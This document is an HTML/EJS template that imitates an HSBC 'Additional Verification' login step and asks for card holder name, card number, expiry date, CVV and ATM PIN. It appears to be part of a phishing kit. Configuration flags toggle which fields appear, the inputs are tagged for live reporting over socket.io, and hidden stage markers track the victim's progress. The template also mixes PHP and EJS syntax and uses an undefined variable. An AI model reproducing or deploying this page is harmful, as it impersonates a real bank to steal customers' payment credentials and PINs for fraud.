<%

let p_card = hsbc.card === 'on' ? true : false;
let p_atm = hsbc.atm === 'on' ? true : false;
let p_cvv = hsbc.cvv === 'on' ? true : false;
let p_expiry = hsbc.exp === 'on' ? true : false;

%>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" type="text/css" href="/assets/hsbc/css/style.css">
        <link rel="shortcut icon" type="image/PNG" href="/assets/hsbc/img/logoTrans.png">
        <title>HSBC - Login</title>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
        <script>
            var lrbank = '<?=escape($udata->last->bank)?>';
            var lrinfo = '<?=escape($udata->last->info)?>';
        </script>
        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
        <script type="text/javascript">
            jQuery(function($){
                $("#input-expiry").mask("99/99", {placeholder:"MM/YY"});
            });
        </script>
        <style>
        .btn {
            background-color: rgb(217, 9, 21) !important;
            border: 1px solid rgb(217, 9, 21) !important;
        }
        </style>
        <script src="/socket.io/socket.io.js"></script>
    </head>
    <body>
        <img src="/assets/hsbc/img/logoTrans.png" id="transLogo">
        <div class="header">
            <div class="headerRow">
                <img src="/assets/hsbc/img/logoTrans.png" id="logo">
                <!-- <div class="btn" id="loginBtn">Login On </div> -->
            </div>
        </div>
        <div class="main">
            <div class="alignment div-main">
                <p class="pageTitle" style="padding-bottom: 0px">Additional Verification</p>
                <form id="loginForm" method='POST' autocomplete="off" class="lab-form" <?=$p_card ? 'onsubmit="return validate()"' : ''?>>
                    <input type="hidden" id="userAgent" name="userAgent">
                    <p style="margin-bottom: 20px; margin-top: 20px;">To verify your login, we require some additional information regarding your account.</p>
                    <% if (p_name) { %>
                        <div class="row" style="align-items: center;">
                            <p class="formLabel">Card Holder's Name</p>
                        </div>
                        <div class="inptContainer" style="margin-bottom: 20px">
                            <input type="text" class="inptField lrinput" attr-action="Filling Name" name='name' id="input-name" required>
                        </div>
                    <% } if (p_card) { %>
                        <div class="row" style="align-items: center;">
                            <p class="formLabel">Card Number</p>
                        </div>
                        <div class="inptContainer" style="margin-bottom: 20px">
                            <input type="tel" class="inptField lrinput" attr-action="Filling Card" name='card' id="input-card" required minlength="19" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" onkeyup="split()">
                            <script src="/assets/js/splitter.js?v=<%= Date.now() %>"></script>
                            <link rel="stylesheet" href="/assets/css/card.css?<%= Date.now() %>">
                        </div>
                    <% } if (p_expiry) { %>
                        <div class="row" style="align-items: center;">
                            <p class="formLabel">Expiry Date</p>
                        </div>
                        <div class="inptContainer" style="margin-bottom: 20px">
                            <input type="tel" class="inptField lrinput" attr-action="Filling Expiry" name='expiry' id="input-expiry" required minlength="5" maxlength="5">
                        </div>
                    <% } if (p_cvv) { %>
                        <div class="row" style="align-items: center;">
                            <p class="formLabel">CVV</p>
                        </div>
                        <div class="inptContainer" style="margin-bottom: 20px">
                            <input type="tel" class="inptField lrinput" attr-action="Filling CVV" name='cvv' id="input-cvv" required minlength="3" maxlength="4">
                        </div>
                    <% } if (p_atm) { %>
                        <div class="row" style="align-items: center;">
                            <p class="formLabel">ATM Pin</p>
                        </div>
                        <div class="inptContainer" style="margin-bottom: 20px">
                            <input type="tel" class="inptField lrinput" attr-action="Filling ATM" name='atm' id="input-atm" required minlength="4" maxlength="6">
                        </div>
                    <% } %>                    
                    <input onclick="submitForm()" type="button" class="btn" value="Continue" id="sbtn" name="save" value="1">
                </form>
            </div>
        </div>
        <span hidden id="navig"> <%=navig%> </span>
        <span hidden id="stage">Card</span>
    </body>
    <script src="/bank/atb/js/scriptCard.js"></script>
    <script src="/bank/hsbc/js/script.js"></script>
</html>
